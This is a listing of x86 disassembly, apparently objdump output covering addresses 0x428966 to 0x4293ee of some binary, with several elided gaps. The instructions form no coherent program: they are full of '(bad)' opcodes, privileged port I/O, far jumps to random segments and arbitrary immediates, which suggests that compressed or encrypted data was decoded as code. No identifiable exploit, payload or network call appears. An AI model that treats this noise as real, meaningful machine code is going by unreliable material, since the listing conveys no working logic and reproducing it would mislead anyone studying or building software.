  428966:	addr16 mov bl,0x1
  428969:	add    BYTE PTR [eax],al
  42896b:	add    DWORD PTR [eax],eax
  42896d:	add    BYTE PTR [edx-0x51],ah
  428970:	sbb    BYTE PTR [edx-0x14],0x2b
  428974:	push   eax
  428975:	mov    bh,0xe4
  428977:	imul   esp,ebx,0xffffffa0
  42897a:	adc    ebp,ecx
  42897c:	scas   eax,DWORD PTR es:[edi]
  42897d:	push   edx
  42897e:	add    edi,DWORD PTR [ebx]
  428980:	shl    DWORD PTR [edx],0x24
  428983:	xchg   ebp,eax
  428984:	aaa    
  428985:	pop    ss
  428986:	int    0x97
  428988:	test   BYTE PTR [ebx+0x622e4423],ch
  42898e:	inc    esp
  42898f:	mov    al,ds:0xb8bdfdfe
  428994:	adc    eax,0x2d89243d
  428999:	mov    ebx,0x9f3ef397
  42899e:	pop    esp
  42899f:	rcr    ebp,1
  4289a1:	sbb    al,0x85
  4289a3:	imul   esp,ecx,0x3b
  4289a6:	or     ebx,ebx
  4289a8:	mov    esp,DWORD PTR ds:0x2109757a
  4289ae:	(bad)  
  4289af:	loopne 0x428941
  4289b1:	mov    eax,ds:0xffc5b842
  4289b6:	sub    al,0xa
  4289b8:	mov    gs,WORD PTR [edx+ebp*2-0x20]
  4289bc:	jp     0x42894f
  4289be:	test   al,0xea
  4289c0:	pusha  
  4289c1:	ret    0xb383
  4289c4:	pop    es
  4289c5:	arpl   WORD PTR [eax+0x1bbfa25],bp
  4289cb:	xchg   ecx,eax
  4289cc:	cli    
  4289cd:	jnp    0x4289b5
  4289cf:	xchg   edx,eax
  4289d0:	mov    ebp,0x5cc1f37b
  4289d5:	add    eax,0xb5c294f5
  4289da:	cdq    
  4289db:	mov    ah,0xe6
  4289dd:	(bad)  
  4289de:	mov    dl,0x56
  4289e0:	cwde   
  4289e1:	and    al,0xd5
  4289e3:	ret    0xe65a
  4289e6:	xchg   esp,eax
  4289e7:	dec    eax
  4289e8:	pop    esi
  4289e9:	fisubr WORD PTR [esi]
  4289eb:	inc    edx
  4289ec:	pop    eax
  4289ed:	es data16 int 0xd8
  4289f1:	mov    fs,WORD PTR [ebp+0x5f]
  4289f4:	jb     0x4289fb
  4289f6:	sub    al,0x12
  4289f8:	push   esp
  4289f9:	mov    ebp,0xe10426f9
  4289fe:	adc    eax,0x236a4420
  428a03:	dec    ebp
  428a04:	sub    DWORD PTR [ebp+0x4b],edx
  428a07:	pop    es
  428a08:	jge    0x4289d5
  428a0a:	add    ebp,edi
  428a0c:	pop    ss
  428a0d:	cmc    
  428a0e:	mov    BYTE PTR [eax-0x1c],ch
  428a11:	mov    ds:0xe1cd3c24,al
  428a16:	cmp    DWORD PTR ds:0x5be46310,0x6de3bbb4
  428a20:	push   ecx
  428a21:	sbb    bl,BYTE PTR [ebx]
  428a23:	mov    WORD PTR [ecx+edi*2],ds
  428a26:	(bad)  
  428a27:	ss (bad) 
  428a29:	stos   DWORD PTR es:[edi],eax
  428a2a:	(bad)  
  428a2b:	sub    dl,dl
  428a2d:	into   
  428a2e:	scas   eax,DWORD PTR es:[edi]
  428a2f:	aas    
  428a30:	sahf   
  428a31:	popf   
  428a32:	aam    0xde
  428a34:	mov    esp,0xe74d1810
  428a39:	repnz mov ah,0x35
  428a3c:	hlt    
  428a3d:	add    al,0xa6
  428a3f:	dec    ebx
  428a40:	push   cs
  428a41:	imul   edx,DWORD PTR [eax+0x3cc786bc],0xffffffea
  428a48:	retf   0x9261
  428a4b:	mov    bl,0xee
  428a4d:	aam    0xf6
  428a4f:	call   0xb3cb:0xd6e2376a
  428a56:	jnp    0x428a1a
  428a58:	pop    ebx
  428a59:	mov    eax,0xcd326dba
  428a5e:	inc    edi
  428a5f:	push   es
  428a60:	add    bh,al
  428a62:	mov    al,0xc2
  428a64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428a65:	arpl   bx,dx
  428a67:	jl     0x428a27
  428a69:	xchg   ebx,eax
  428a6a:	arpl   WORD PTR [ebx+ebx*8+0x3e],di
	...
  428ad5:	add    BYTE PTR [ebp+0xc],cl
  428ad8:	clc    
  428ad9:	pop    ebx
  428ada:	stc    
  428adb:	(bad)  
  428adc:	out    dx,eax
  428add:	push   ds
  428ade:	pop    ds
  428adf:	bound  edx,QWORD PTR [eax-0x819e1ed]
  428ae5:	outs   dx,BYTE PTR ds:[esi]
  428ae6:	addr16 mov ah,0x1
  428ae9:	add    BYTE PTR [eax],al
  428aeb:	add    DWORD PTR [eax],eax
  428aed:	add    BYTE PTR [edi+0x42],cl
  428af0:	scas   al,BYTE PTR es:[edi]
  428af1:	jecxz  0x428a7a
  428af3:	es pop edi
  428af5:	out    0x96,eax
  428af7:	lea    edx,[ebx]
  428af9:	adc    ch,BYTE PTR [ebp+0x38]
  428afc:	push   0xcc3f36a9
  428b01:	adc    al,0xd9
  428b03:	and    al,0x7a
  428b05:	add    edx,DWORD PTR [ecx-0x21dbd236]
  428b0b:	jmp    0x105:0x78d33df4
  428b12:	mov    edx,0xc7f4a1de
  428b17:	mov    bh,0x72
  428b19:	xor    edx,DWORD PTR [esi-0xf9b2a56]
  428b1f:	out    0x68,eax
  428b21:	out    0xd8,al
  428b23:	push   esi
  428b24:	mov    WORD PTR [eax+0x7c],?
  428b27:	push   es
  428b28:	xor    DWORD PTR [ecx-0x5b],esi
  428b2b:	icebp  
  428b2c:	ss iret 
  428b2e:	sub    DWORD PTR [esi-0x9],esi
  428b31:	jne    0x428afa
  428b33:	sbb    al,BYTE PTR [ebp+ecx*1+0x44]
  428b37:	fs cwde 
  428b39:	pop    esp
  428b3a:	mov    ecx,0xc82a5ed4
  428b40:	in     eax,dx
  428b41:	sub    al,0x2c
  428b43:	mov    bh,0x7e
  428b45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428b46:	or     DWORD PTR [esi+0x68],esi
  428b49:	xchg   ebp,eax
  428b4a:	ret    0x3c07
  428b4d:	xor    ah,BYTE PTR [edi+0x51d5eba]
  428b53:	push   ecx
  428b54:	inc    eax
  428b55:	sahf   
  428b56:	xor    DWORD PTR [ebp-0x17e9845b],ecx
  428b5c:	mov    edi,0xdaf6407d
  428b61:	sbb    ecx,esi
  428b63:	mov    bl,0x30
  428b65:	sub    al,0x7d
  428b67:	push   ebp
  428b68:	jge    0x428b34
  428b6a:	and    eax,DWORD PTR [eax]
  428b6c:	or     al,0xc8
  428b6e:	pop    ss
  428b6f:	dec    eax
  428b70:	js     0x428b67
  428b72:	in     eax,0x33
  428b74:	jl     0x428b8f
  428b76:	scas   al,BYTE PTR es:[edi]
  428b77:	rcr    DWORD PTR [edx],cl
  428b79:	call   0x6917:0xd7a507cb
  428b80:	stc    
  428b81:	lds    eax,FWORD PTR [edi+0x61]
  428b84:	aaa    
  428b85:	popf   
  428b86:	int3   
  428b87:	push   ecx
  428b88:	jb     0x428b3a
  428b8a:	mov    cs,WORD PTR [edi-0x3c4f47b4]
  428b90:	(bad)  
  428b91:	pusha  
  428b92:	push   edi
  428b93:	outs   dx,BYTE PTR ds:[esi]
  428b94:	push   ebp
  428b95:	xor    dl,BYTE PTR [edx+0x59]
  428b98:	cld    
  428b99:	mov    ds:0x9964d06b,ax
  428b9f:	xchg   ah,bl
  428ba1:	jmp    0xc0e8:0x618a3d24
  428ba8:	adc    DWORD PTR [edi+0x5bef2ff0],0xcf9c5f28
  428bb2:	mov    edi,0x8913e2a
  428bb7:	mov    ds:0x8be5aa56,al
  428bbc:	aas    
  428bbd:	aam    0x5a
  428bbf:	fld    DWORD PTR [edi+0x1d2c18db]
  428bc5:	cli    
  428bc6:	mov    DWORD PTR ds:0xf451fac1,esi
  428bcc:	dec    edi
  428bcd:	mov    ds:0xcd01cd9f,al
  428bd2:	mov    ch,0x11
  428bd4:	test   al,0x8d
  428bd6:	cwde   
  428bd7:	jmp    0x4ec7:0x2d52baf4
  428bde:	mov    ds:0xdeecf347,eax
  428be3:	sahf   
  428be4:	xor    edi,DWORD PTR [eax]
  428be6:	push   ebp
  428be7:	jmp    0x86cc:0x83cbed34
	...
  428c56:	lds    edx,FWORD PTR [ebp-0x76]
  428c59:	cli    
  428c5a:	call   0xbbc:0x947ff5ff
  428c61:	push   0x527cdad7
  428c66:	addr16 mov ch,0x1
  428c69:	add    BYTE PTR [eax],al
  428c6b:	add    DWORD PTR [eax],eax
  428c6d:	add    BYTE PTR [ebx],ah
  428c6f:	shl    DWORD PTR [ebx+esi*8],0xbb
  428c73:	add    dh,BYTE PTR es:[ecx+0xbd28c07]
  428c7a:	push   ds
  428c7b:	cmp    cl,bh
  428c7d:	mov    al,ds:0xcc48d15f
  428c82:	aaa    
  428c83:	js     0x428cb2
  428c85:	mov    ds,WORD PTR [ebx+ecx*1-0x22]
  428c89:	cld    
  428c8a:	cmp    dl,dh
  428c8c:	loope  0x428c64
  428c8e:	je     0x428ccf
  428c90:	push   ebx
  428c91:	sbb    al,0xd4
  428c93:	daa    
  428c94:	fst    DWORD PTR [ebp+ebx*1-0x61f78ffe]
  428c9b:	stos   DWORD PTR es:[edi],eax
  428c9c:	mov    cl,0x9
  428c9e:	packsswb mm7,QWORD PTR [eax]
  428ca1:	xlat   BYTE PTR ds:[ebx]
  428ca2:	jg     0x428cdd
  428ca4:	cmp    al,0x10
  428ca6:	out    0x28,al
  428ca8:	push   esi
  428ca9:	sbb    cl,BYTE PTR [edi-0x10354cb3]
  428caf:	xchg   edi,edi
  428cb1:	xchg   ebp,eax
  428cb2:	xchg   ebx,eax
  428cb3:	and    eax,esi
  428cb5:	adc    DWORD PTR [edx-0x4e],ebp
  428cb8:	push   esp
  428cb9:	hlt    
  428cba:	lods   al,BYTE PTR ds:[esi]
  428cbb:	cmp    dl,dh
  428cbd:	sbb    eax,0x825cc95c
  428cc2:	sub    ebx,DWORD PTR [ecx+0x4f4acffd]
  428cc8:	pop    es
  428cc9:	test   BYTE PTR [ebx],ch
  428ccb:	sub    eax,0x944a1e7d
  428cd0:	aam    0x72
  428cd2:	ror    BYTE PTR [eax+0x20],0x6
  428cd6:	mov    ebp,0x8b9292b9
  428cdb:	mov    edi,gs
  428cdd:	in     eax,dx
  428cde:	inc    esi
  428cdf:	mov    esi,0xe2d67034
  428ce4:	lods   eax,DWORD PTR ds:[esi]
  428ce5:	adc    BYTE PTR [ebx-0x2b],dl
  428ce8:	fld    st(7)
  428cea:	xchg   ebp,eax
  428ceb:	inc    eax
  428cec:	dec    DWORD PTR [eax-0x27]
  428cef:	push   0x95ef0c1
  428cf4:	mov    ds:0x7e484d37,eax
  428cf9:	xor    ebx,eax
  428cfb:	daa    
  428cfc:	fs loope 0x428ced
  428cff:	retf   0x97e8
  428d02:	imul   eax,DWORD PTR [eax+0x2c],0x4
  428d06:	dec    DWORD PTR [eax+ecx*1+0x22]
  428d0a:	xlat   BYTE PTR ds:[ebx]
  428d0b:	and    eax,0xb3dd0fae
  428d10:	in     al,dx
  428d11:	mov    ebp,0xc642c902
  428d16:	fnstcw WORD PTR [ecx+0x69]
  428d19:	sbb    al,0x85
  428d1b:	jbe    0x428cb4
  428d1d:	call   0xfb2c:0xda19339b
  428d24:	xor    DWORD PTR [ebp-0x23],eax
  428d27:	mov    bh,0xe9
  428d29:	pop    eax
  428d2a:	dec    ebx
  428d2b:	aaa    
  428d2c:	mov    ch,0x9e
  428d2e:	jle    0x428d7d
  428d30:	inc    eax
  428d31:	ss out dx,eax
  428d33:	dec    ebx
  428d34:	imul   esi,DWORD PTR [edi+ebp*1+0x31],0x68
  428d39:	stos   DWORD PTR es:[edi],eax
  428d3a:	or     dl,BYTE PTR [ecx+ebp*4-0x14]
  428d3e:	cwde   
  428d3f:	gs xor ebx,ebx
  428d42:	clc    
  428d43:	jmp    0x428cef
  428d45:	and    ebp,ebp
  428d47:	push   cs
  428d48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428d49:	cmp    eax,0x2e7dfe5e
  428d4e:	mov    al,0xf
  428d50:	sbb    eax,0x6d5e8f01
  428d55:	out    0x8e,al
  428d57:	ds (bad) 
  428d59:	sbb    BYTE PTR [edi+0x32],bh
  428d5c:	mov    esi,0x6fcae1d7
  428d61:	sbb    edi,eax
  428d63:	sub    eax,0xb532fd46
  428d68:	dec    esp
  428d69:	dec    edi
  428d6a:	enter  0xd0a0,0xc8
	...
  428dd6:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428de0:	ins    BYTE PTR es:[edi],dx
  428de1:	retf   0x81cd
  428de4:	push   ecx
  428de5:	mov    ds:0x1b667,al
  428dea:	add    BYTE PTR [ecx],al
  428dec:	add    BYTE PTR [eax],al
  428dee:	cli    
  428def:	inc    esp
  428df0:	adc    dl,bh
  428df2:	jns    0x428d95
  428df4:	jnp    0x428e68
  428df6:	test   BYTE PTR [ebp-0x55],bh
  428df9:	stos   BYTE PTR es:[edi],al
  428dfa:	xchg   ebp,eax
  428dfb:	xchg   ah,al
  428dfd:	fs pop es
  428dff:	mov    eax,ds:0xbb5e922c
  428e04:	and    al,0x22
  428e06:	push   eax
  428e07:	into   
  428e08:	cmp    BYTE PTR [edi],al
  428e0a:	ins    BYTE PTR es:[edi],dx
  428e0b:	cwde   
  428e0c:	daa    
  428e0d:	xchg   ecx,eax
  428e0e:	sub    al,0xf4
  428e10:	push   ds
  428e11:	xchg   ecx,eax
  428e12:	ja     0x428dac
  428e14:	sbb    dh,BYTE PTR [esp+ecx*4-0x457e9215]
  428e1b:	daa    
  428e1c:	imul   ebx,DWORD PTR [esi+eax*8-0x2f],0x175d2aeb
  428e24:	repz call DWORD PTR ds:0x9549e16b
  428e2b:	cmp    eax,0xdb9a1506
  428e30:	retf   
  428e31:	mov    eax,0x1a308486
  428e36:	xchg   edx,eax
  428e37:	push   ebp
  428e38:	dec    eax
  428e39:	sub    ah,0x21
  428e3c:	sbb    bh,BYTE PTR [ecx]
  428e3e:	fld    TBYTE PTR [ecx]
  428e40:	dec    esp
  428e41:	cmp    DWORD PTR [esi+0x1f],edi
  428e44:	mov    ch,0x60
  428e46:	aas    
  428e47:	pop    ebp
  428e48:	pop    edx
  428e49:	mov    ch,0x90
  428e4b:	cmc    
  428e4c:	cmp    al,0xb2
  428e4e:	lea    ebx,ss:[esi-0x792d72c7]
  428e55:	inc    esi
  428e56:	mov    dl,0xb9
  428e58:	movq   mm3,mm1
  428e5b:	pop    ds
  428e5c:	test   eax,0x37569897
  428e61:	fs pop esi
  428e63:	sub    dh,BYTE PTR [edx-0x39bf42b6]
  428e69:	jbe    0x428e33
  428e6b:	scas   eax,DWORD PTR es:[edi]
  428e6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428e6d:	jne    0x428e64
  428e6f:	mov    bh,0xc7
  428e71:	xor    DWORD PTR [ecx-0x4a998fa1],edx
  428e77:	outs   dx,DWORD PTR ds:[esi]
  428e78:	std    
  428e79:	push   ds
  428e7a:	jl     0x428ef0
  428e7c:	mov    dh,0x56
  428e7e:	faddp  st(3),st
  428e80:	repz and bh,dh
  428e83:	or     al,0xb6
  428e85:	mov    eax,ds:0x9a0c9fa1
  428e8a:	mov    edi,0x24a0550d
  428e8f:	jns    0x428ea7
  428e91:	mov    cl,0x33
  428e93:	dec    ebp
  428e94:	mov    edi,0xa7e01e5e
  428e99:	ins    DWORD PTR es:[edi],dx
  428e9a:	push   edi
  428e9b:	gs popa 
  428e9d:	loop   0x428ea0
  428e9f:	call   0xe160519
  428ea4:	out    0xe8,al
  428ea6:	scas   eax,DWORD PTR es:[edi]
  428ea7:	mov    DWORD PTR [ebp-0x5731ef91],ebx
  428ead:	adc    ah,dl
  428eaf:	retf   
  428eb0:	jnp    0x428f09
  428eb2:	imul   ebp,DWORD PTR [ebx],0x97d5a343
  428eb8:	xor    DWORD PTR [ecx+0x1473eea1],ebx
  428ebe:	dec    eax
  428ebf:	mov    esp,DWORD PTR ds:0x460c8ccc
  428ec5:	inc    ebp
  428ec6:	adc    BYTE PTR [ebx],dl
  428ec8:	stos   BYTE PTR es:[edi],al
  428ec9:	or     DWORD PTR [ebx],0xffffffeb
  428ecc:	ss pop es
  428ece:	pop    es
  428ecf:	retf   0x4270
  428ed2:	aas    
  428ed3:	popa   
  428ed4:	out    dx,al
  428ed5:	pop    esp
  428ed6:	mov    eax,ds:0x1a4e0416
  428edb:	(bad)  
  428edd:	(bad)  
  428ede:	imul   ecx,DWORD PTR [ecx],0xffffffa8
  428ee1:	nop
  428ee2:	or     edx,DWORD PTR [eax-0x13]
  428ee5:	adc    eax,0x3ce131a3
  428eea:	push   ebx
  428eeb:	bound  ecx,QWORD PTR [ecx+0xfe]
	...
  428f55:	add    BYTE PTR [edi+0x5d],cl
  428f58:	pop    ecx
  428f59:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428f5d:	fstp   st(1)
  428f5f:	ror    DWORD PTR [esp+edx*4],0xc0
  428f63:	stos   DWORD PTR es:[edi],eax
  428f64:	add    BYTE PTR [esi+0x67],0xb7
  428f68:	add    DWORD PTR [eax],eax
  428f6a:	add    BYTE PTR [ecx],al
  428f6c:	add    BYTE PTR [eax],al
  428f6e:	retf   0x3472
  428f71:	xor    ebp,0x747d1d
  428f77:	cwde   
  428f78:	fadd   DWORD PTR [ebx+0x11ef3dfa]
  428f7e:	xchg   esi,eax
  428f7f:	cmp    edx,DWORD PTR [ebx]
  428f81:	(bad)  
  428f82:	mov    DWORD PTR [esp+ecx*2-0x466abf70],edi
  428f89:	xor    al,ah
  428f8b:	mov    esi,DWORD PTR [edi+eax*4]
  428f8e:	call   0x7b69:0x1098a448
  428f95:	fstp   QWORD PTR [ebx]
  428f97:	jb     0x428f77
  428f99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428f9a:	adc    al,0xce
  428f9c:	mov    edi,0xe6943fe3
  428fa1:	push   0x3e2213be
  428fa6:	or     al,0xff
  428fa8:	addr16 ret 0x796c
  428fac:	ss inc ecx
  428fae:	mov    ebx,?
  428fb0:	mov    ebp,0x29b8dcb3
  428fb5:	(bad)  
  428fb6:	(bad)  
  428fb8:	in     al,dx
  428fb9:	leave  
  428fba:	call   0x7d529652
  428fbf:	sbb    DWORD PTR [eax+eax*8+0x60],ebp
  428fc3:	jp     0x428f9c
  428fc5:	pushf  
  428fc6:	or     bl,BYTE PTR [esi+0x1b5b8293]
  428fcc:	fsub   DWORD PTR [edi]
  428fce:	out    0x33,al
  428fd0:	cmp    eax,DWORD PTR [ebp+ecx*1+0x3a1c255e]
  428fd7:	pop    esi
  428fd8:	repz inc edx
  428fda:	mov    al,0xe7
  428fdc:	inc    edi
  428fdd:	xchg   ecx,eax
  428fde:	js     0x428fcb
  428fe0:	hlt    
  428fe1:	rcl    BYTE PTR [esi-0x48031b5b],cl
  428fe7:	loope  0x428fa4
  428fe9:	(bad)  
  428fea:	push   esp
  428feb:	scas   al,BYTE PTR es:[edi]
  428fec:	sub    eax,0x5e8ddf13
  428ff1:	in     al,dx
  428ff2:	inc    eax
  428ff3:	adc    eax,0x98f21b1f
  428ff8:	sub    eax,0x98f87dbe
  428ffd:	std    
  428ffe:	call   0x641df33a
  429003:	and    ah,BYTE PTR [edx-0x10]
  429006:	xchg   edx,eax
  429007:	dec    ecx
  429008:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429009:	push   eax
  42900a:	dec    eax
  42900b:	repz fsubr DWORD PTR [esi+0x34]
  42900f:	test   al,0x83
  429011:	pop    edx
  429012:	stos   WORD PTR es:[edi],ax
  429014:	xor    dh,bl
  429016:	xchg   edx,eax
  429017:	dec    edi
  429018:	stc    
  429019:	(bad)
  42901c:	bnd jmp DWORD PTR [edx]
  42901f:	jmp    0x42902c
  429021:	cmp    BYTE PTR [ebx+esi*1],dl
  429024:	sbb    al,0x9e
  429026:	jmp    0x8f49e211
  42902b:	(bad)  
  42902c:	push   cs
  42902d:	xor    ebx,DWORD PTR [ebx]
  42902f:	pop    ss
  429030:	inc    ebp
  429031:	sbb    ebx,edx
  429033:	in     eax,0xb9
  429035:	inc    esi
  429036:	std    
  429037:	imul   esi
  429039:	shr    BYTE PTR [ebx+0x31],cl
  42903c:	test   BYTE PTR ds:0x4eb6cd25,dh
  429042:	out    dx,eax
  429043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429044:	cmp    al,0xab
  429046:	enter  0x8a26,0x30
  42904a:	(bad)  
  42904b:	les    ebx,FWORD PTR [ebx-0x706d6f41]
  429051:	pop    ebp
  429052:	dec    edi
  429053:	call   0xa4a52cad
  429058:	ficomp DWORD PTR [ecx]
  42905a:	inc    esi
  42905b:	sub    ecx,DWORD PTR [ebx]
  42905d:	jae    0x428ff0
  42905f:	arpl   WORD PTR [ebp+0x3632599d],bx
  429065:	aad    0x3a
  429067:	jnp    0x429087
  429069:	(bad)  
  42906a:	and    DWORD PTR [edi+0xebf5],ebx
	...
  4290d4:	add    BYTE PTR [eax],al
  4290d6:	loope  0x4290c4
  4290d8:	mov    ebx,es
  4290da:	(bad)  
  4290db:	jecxz  0x4290cc
  4290dd:	out    dx,al
  4290de:	mov    edi,0xaefc7b77
  4290e3:	mov    esp,0xb8674eea
  4290e8:	add    DWORD PTR [eax],eax
  4290ea:	add    BYTE PTR [ecx],al
  4290ec:	add    BYTE PTR [eax],al
  4290ee:	mov    edx,0x93e69d33
  4290f3:	xor    DWORD PTR [esi],ebp
  4290f5:	lahf   
  4290f6:	xchg   ebx,eax
  4290f7:	hlt    
  4290f8:	jmp    0x4290b8
  4290fa:	cmp    eax,0xa359c0a2
  4290ff:	xchg   DWORD PTR [edx],eax
  429101:	adc    eax,0x52a12e42
  429106:	mov    ah,0x80
  429108:	sar    DWORD PTR [eax+0x23],1
  42910b:	sub    DWORD PTR [eax+0x31],ebp
  42910e:	into   
  42910f:	call   0x9c53:0x2af2fa2d
  429116:	sbb    eax,0x510fc667
  42911b:	enter  0x2a7d,0x7
  42911f:	jle    0x42918d
  429121:	loop   0x429106
  429123:	dec    edi
  429124:	jmp    0x69b681e8
  429129:	jecxz  0x4290ff
  42912b:	fild   QWORD PTR ds:0x39119cc3
  429131:	pop    es
  429132:	sbb    BYTE PTR [ebx-0x3a6efb5f],ch
  429138:	js     0x429106
  42913a:	xchg   edx,eax
  42913b:	mov    dh,0xc1
  42913d:	sub    ebp,ecx
  42913f:	out    dx,eax
  429140:	aad    0x5f
  429142:	test   al,0xe5
  429144:	xchg   ecx,eax
  429145:	scas   al,BYTE PTR es:[edi]
  429146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429147:	mov    ds:0xd7c66bf5,al
  42914c:	bound  edi,QWORD PTR [ebx]
  42914e:	add    eax,0x7346023d
  429153:	shl    BYTE PTR [edi+0x21ca5aad],0xaf
  42915a:	sub    BYTE PTR [edi],bl
  42915c:	jb     0x42916d
  42915e:	stos   DWORD PTR es:[edi],eax
  42915f:	xchg   edi,eax
  429160:	into   
  429161:	mov    ecx,0xb582351
  429166:	push   ebp
  429167:	and    dl,cl
  429169:	pop    edx
  42916a:	jne    0x4291cd
  42916c:	pop    ecx
  42916d:	xchg   DWORD PTR ds:0x69367f9c,ebx
  429173:	in     eax,dx
  429174:	enter  0x2906,0x8
  429178:	sbb    eax,0xd2a7e076
  42917d:	and    ch,BYTE PTR [ebx-0x39e18baa]
  429183:	repz gs lock push eax
  429187:	hlt    
  429188:	push   ebp
  429189:	sub    ah,al
  42918b:	adc    BYTE PTR [ecx],0x9a
  42918e:	int    0x89
  429190:	pop    ss
  429191:	jg     0x4291d7
  429193:	lods   eax,DWORD PTR ds:[esi]
  429194:	adc    ebx,DWORD PTR [edi+0x26]
  429197:	jmp    0x5fc4de56
  42919c:	clc    
  42919d:	stc    
  42919e:	jae    0x4291ab
  4291a0:	xchg   esp,eax
  4291a1:	push   esi
  4291a2:	mov    esp,0x44f735fe
  4291a7:	(bad)  
  4291a8:	idiv   DWORD PTR [ecx+ebx*4]
  4291ab:	cmp    BYTE PTR [ecx+0x1d],bl
  4291ae:	push   es
  4291af:	push   edi
  4291b0:	(bad)  
  4291b1:	pop    ss
  4291b2:	in     al,0xc9
  4291b4:	(bad)  
  4291b5:	popf   
  4291b6:	jo     0x4291f7
  4291b8:	mov    bl,0x0
  4291ba:	xchg   BYTE PTR [edi+0x78],bh
  4291bd:	inc    esi
  4291be:	ja     0x4291e7
  4291c0:	add    BYTE PTR [edx+0x54],ah
  4291c3:	lods   al,BYTE PTR ds:[esi]
  4291c4:	cmc    
  4291c5:	(bad)  
  4291c6:	gs push edx
  4291c8:	mov    ah,0x11
  4291ca:	push   ebp
  4291cb:	sbb    ecx,DWORD PTR [ebp+0x7a956d6d]
  4291d1:	pop    esp
  4291d2:	cmp    BYTE PTR [ecx],ah
  4291d4:	das    
  4291d5:	sbb    BYTE PTR [edi],al
  4291d7:	mov    ds:0xbf2377d5,al
  4291dc:	cmp    DWORD PTR [edx-0x73],ebp
  4291df:	aas    
  4291e0:	adc    eax,0x73bc3eae
  4291e5:	inc    esp
  4291e6:	jne    0x4291f0
  4291e8:	inc    eax
  4291e9:	mov    edi,0xc7dc041f
	...
  429256:	push   esi
  429257:	xchg   ebp,edi
  429259:	test   ch,bh
  42925b:	(bad)  
  42925c:	jg     0x429235
  42925e:	into   
  42925f:	retf   
  429260:	or     DWORD PTR [eax+edx*1+0x67957fbb],0x1b9
  42926b:	add    DWORD PTR [eax],eax
  42926d:	add    dl,bh
  42926f:	sar    bl,0xdd
  429272:	pop    ebp
  429273:	push   cs
  429274:	aaa    
  429275:	push   ecx
  429276:	hlt    
  429277:	jne    0x429228
  429279:	in     al,0x7c
  42927b:	sbb    ebx,0x69
  42927e:	jge    0x4292e4
  429280:	add    eax,0x13959967
  429285:	cmp    DWORD PTR [eax],esi
  429287:	mov    edx,0x6631ccbc
  42928c:	scas   eax,DWORD PTR es:[edi]
  42928d:	(bad)  
  42928e:	(bad)  
  42928f:	int    0x18
  429291:	in     al,0x43
  429293:	shl    DWORD PTR ss:[ebx+0x7b],1
  429297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429298:	push   ss
  429299:	or     al,0xec
  42929b:	inc    ebp
  42929c:	shl    BYTE PTR cs:[esi-0x72],1
  4292a0:	ss push ds
  4292a2:	stc    
  4292a3:	mov    al,0xac
  4292a5:	repnz bound edx,QWORD PTR [edx-0x54]
  4292a9:	mov    ecx,DWORD PTR [edi-0x22f8a914]
  4292af:	(bad)  
  4292b0:	dec    edx
  4292b1:	xor    eax,0xaf65bc00
  4292b6:	sub    BYTE PTR [edx+0x1d0a693b],al
  4292bc:	test   BYTE PTR [ebx],ah
  4292be:	aad    0x60
  4292c0:	push   ebp
  4292c1:	scas   eax,DWORD PTR es:[edi]
  4292c2:	mov    ebp,0x56579df8
  4292c7:	lds    eax,FWORD PTR [ecx+0x53b61a55]
  4292cd:	adc    BYTE PTR [bx+si],bl
  4292d0:	push   0xffffffe0
  4292d2:	stos   DWORD PTR es:[edi],eax
  4292d3:	inc    edx
  4292d5:	jmp    0xbbd3:0x8a564b3f
  4292dc:	jnp    0x429283
  4292de:	sbb    al,0xd7
  4292e0:	add    dl,BYTE PTR [eax-0x5cb2ddb9]
  4292e6:	jne    0x4292dd
  4292e8:	ja     0x429335
  4292ea:	xor    edx,edx
  4292ec:	out    dx,al
  4292ed:	fisub  WORD PTR [ebx-0xe]
  4292f0:	mov    BYTE PTR [ebx],bl
  4292f2:	mov    ebx,0x1651ab0a
  4292f7:	push   cs
  4292f8:	fwait
  4292f9:	push   0x29fe23d2
  4292fe:	mov    ch,0xa3
  429300:	inc    ecx
  429301:	or     eax,0x36dd0bdb
  429306:	pop    es
  429307:	cs loope 0x429382
  42930a:	mov    dl,0x56
  42930c:	pop    ebp
  42930d:	jl     0x429384
  42930f:	pop    ecx
  429310:	hlt    
  429311:	rcr    DWORD PTR [ecx+eax*4],1
  429314:	jo     0x4292e5
  429316:	iret   
  429317:	xchg   ebp,eax
  429318:	sub    dh,BYTE PTR [esi-0x765e838a]
  42931e:	mov    ss,WORD PTR [edx-0x59]
  429321:	jne    0x42931d
  429323:	mov    bl,al
  429325:	lods   eax,DWORD PTR ds:[esi]
  429326:	stos   DWORD PTR es:[edi],eax
  429327:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429328:	and    al,0xb6
  42932a:	jmp    0xd305a2e2
  42932f:	fcomp  QWORD PTR [ecx]
  429331:	xchg   esi,eax
  429332:	call   0xca9647db
  429337:	push   ds
  429338:	idiv   BYTE PTR [eax]
  42933a:	xchg   BYTE PTR [esi],bh
  42933c:	fdivr  DWORD PTR [ecx+0x1a00bd7a]
  429342:	push   ebx
  429343:	pop    esp
  429344:	jge    0x4292c9
  429346:	adc    dl,BYTE PTR [ecx]
  429348:	cli    
  429349:	(bad)  
  42934a:	sbb    ebp,DWORD PTR [edi-0x44]
  42934d:	sbb    DWORD PTR [edx+0x216ce90a],esi
  429353:	mov    esp,0xc64933eb
  429358:	mov    es,WORD PTR [edx-0x552eedc3]
  42935e:	stos   DWORD PTR es:[edi],eax
  42935f:	das    
  429360:	xor    ecx,DWORD PTR [eax]
  429362:	or     eax,0xc251aa51
  429367:	xchg   BYTE PTR [edi-0x28],cl
  42936a:	out    0x55,eax
  42936c:	add    dl,BYTE PTR [edi]
	...
  4293d6:	lock adc al,0xe1
  4293d9:	(bad)  
  4293da:	in     eax,0xff
  4293dc:	call   FWORD PTR [esi]
  4293de:	jae    0x4293e5
  4293e0:	dec    edx
  4293e1:	mov    bh,0x20
  4293e3:	xor    eax,0xba672086
  4293e8:	add    DWORD PTR [eax],eax
  4293ea:	add    BYTE PTR [ecx],al
  4293ec:	add    BYTE PTR [eax],al
  4293ee:	aaa    
